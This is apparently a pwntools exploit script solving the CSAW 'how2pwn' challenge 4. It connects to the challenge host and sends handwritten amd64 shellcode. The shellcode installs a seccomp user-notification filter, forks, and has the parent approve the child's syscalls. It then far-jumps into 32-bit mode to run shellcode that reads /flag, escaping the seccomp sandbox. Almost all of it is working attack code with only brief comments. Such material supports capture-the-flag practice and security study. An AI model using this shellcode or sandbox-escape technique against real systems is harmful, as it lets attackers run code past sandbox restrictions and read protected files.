from pwn import *
import time,sys

exe = ELF("chal4_patched")
exe_rop = ROP(exe)
# libc = ELF("libc6_2.31-0ubuntu9.7_amd64.so")

# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def wait():
    if args.LOCAL and args.R2:
        input("wait")
    else:
        time.sleep(0.2)
def log_print(*msg):
    log.info(" ".join(map(str,msg)))
lp = log_print
def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("how2pwn.chal.csaw.io", 60004)
    return r

io = start()
wait()
io.send(b"7a01505a0cfefc2f8249cb24e01a2890")

shellcode = f'''
    mov esp,0xcafe800
    /*
    syscall(317,SECCOMP_SET_MODE_FILTER,SECCOMP_FILTER_FLAG_NEW_LISTENER ,&exp_prog);
    seccomp.h
    */
    mov rsi,0x8 /* SECCOMP_FILTER_FLAG_NEW_LISTENER = 8*/
    /*
    struct sock_filter exp_filter[]
    BPF_STMT(BPF_LD+BPF_W+BPF_ABS, offsetof(struct seccomp_data, arch)),
	BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, AUDIT_ARCH_X86_64, 1, 0),
	BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_USER_NOTIF),
	BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW),
    */
    mov rbx,0x7fff000000000006
    push rbx
    mov rbx, 0x7fc0000000000006
    push rbx
    mov rbx, 0xc000003e00010015
    push rbx
    mov rbx, 0x400000020
    push rbx
    /*
    struct sock_fprog exp_prog
    .len = sizeof(exp_filter) / sizeof(exp_filter[0]),
    .filter = exp_filter,
    */
    mov rbx,rsp
    push rbx
    xor rbx,rbx
    mov bl,0x4
    push rbx

    mov rdx,rsp /* exp_prog */
    mov rax, 0x13d /*0x13d = seccomp*/
    mov rdi,1 /* SECCOMP_SET_MODE_FILTER = 1*/
    syscall

    /*
    int pid = syscall(__NR_fork)
    */
    mov r8,rax
    mov rax, 0x39
    syscall

    cmp rax, 0 /* if pid == 0*/

    je child_process
parent_process:
    xor rax,rax
clean_req_and_resp:
    mov ecx, 0xd
    mov rdx, 0xcafec00
loop:
    mov qword ptr [rdx],rax
    dec rcx
    add dl,0x8
    cmp rcx,0
    jne loop
recv:
    /*
    syscall(__NR_ioctl,fd, SECCOMP_IOCTL_NOTIF_RECV, &req);
    */
    mov rax, 0x10
    mov rdi,r8
    mov rsi,0xc0502100
    mov rdx,0xcafec00
    syscall

copy_id_of_resp:
    mov rax, 0xcafec00
    mov rbx, qword ptr[rax]
    add al,0x50
    mov qword ptr[rax], rbx
set_flags_of_resp:
    add al,0x14
    mov rbx,1
    mov dword ptr[rax], ebx
resp:
    /*
    syscall(__NR_ioctl,fd, SECCOMP_IOCTL_NOTIF_SEND, &resp);
    */
    xor rax,rax
    mov al,  0x10
    mov rdi, r8
    mov esi, 0xc0182101
    mov edx, 0xcafec50
    syscall
    jmp parent_process

child_process:
    mov rcx,0x100000
wait_loop:
    dec rcx
    cmp rcx,0
    jne wait_loop
show_flag:
    mov rax,0xcafe180
    mov rbx,0x2300000000
    xor rax,rbx
    push rax
    retf
'''

flag_path_1 = hex(u32(b"/fla"))
flag_path_2 = hex(u32(b"g\0\0\0"))
X32_showflag=f'''
mov esp, 0xcafe900
mov eax, 0x5
push {flag_path_2}
push {flag_path_1}
mov ebx,esp
xor ecx,ecx
xor edx,edx
int 0x80

mov ebx,eax
mov eax,0x3
mov ecx,0xcafea00
xor edx, edx
mov edx, 0x100
int 0x80

mov eax, 4
mov ebx, 1
int 0x80
'''

shellcode0 = asm(shellcode,arch="amd64")
log_print("shellcode 0 length",hex(len(shellcode0)))
context.arch = 'i386'
context.bits = 32

shellcode1 = asm(X32_showflag)
log_print("shellcode 1 length",hex(len(shellcode1)))
shellcode = flat({
    0x0:shellcode0,
    0x180:shellcode1
},filler=b"\x00")
log_print("shellcode length",hex(len(shellcode)))
wait()
io.sendafter(b"shellcode: \n",shellcode)

io.interactive()